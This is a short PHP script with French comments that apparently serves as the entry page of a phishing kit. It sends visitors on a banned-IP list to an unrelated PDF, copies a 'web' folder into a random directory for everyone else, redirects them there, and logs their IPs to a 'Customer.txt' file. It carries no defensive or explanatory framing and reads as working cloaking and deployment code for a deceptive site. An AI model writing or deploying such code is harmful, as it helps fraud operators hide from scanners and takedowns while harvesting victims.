<?php
// Obtenir l'adresse IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'];

// Chemin vers le fichier texte contenant les adresses IP bannies
$cheminFichierBannir = 'ipbannir.txt';

// Vérifier si le fichier bannir.txt existe
if (file_exists($cheminFichierBannir)) {
    // Lire le contenu du fichier bannir.txt dans un tableau
    $adressesBannies = file($cheminFichierBannir, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    // Vérifier si l'adresse IP du visiteur existe dans la liste des adresses bannies
    if (in_array($ip, $adressesBannies)) {
        // L'adresse IP du visiteur est bannie
    header('Location: https://www.wordstream.com/wp-content/uploads/2023/05/2023-LiQ-GoogleAd-Benchmarks-Updated.pdf?mkt_tok=NjIyLUJIQy01MTcAAAGMWd-U39pqYAsE4oyWwfRpvRDioiC9sWH-6R1WIzr4_pyMpz-e4O5WakuokhIEo_iiLs4Y97G4-omXblBW6_xsg5vDZ5LucWpYIGB7k4zuczs755nP');
    exit;
        // Vous pouvez prendre des mesures supplémentaires, comme afficher un message personnalisé ou rediriger l'utilisateur vers une page d'erreur.
    } else {
        $random=rand(0,100000);
$md5=md5("$random");

$dst= $random;
function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
    if(( $file != '.' ) && ( $file != '..' )) { 
        if ( is_dir($src . '/' . $file) ) { 
        recurse_copy($src . '/' . $file,$dst . '/' . $file); 
         } 
    else { 
        copy($src . '/' . $file,$dst . '/' . $file); 
    } 
    } 
    } 
    closedir($dir); 
    } 
$src="web";
recurse_copy( $src, $dst );
header("location:$dst");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Customer.txt","a");
fwrite($file,$ip." |> ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n");	
	
    }
}
?>
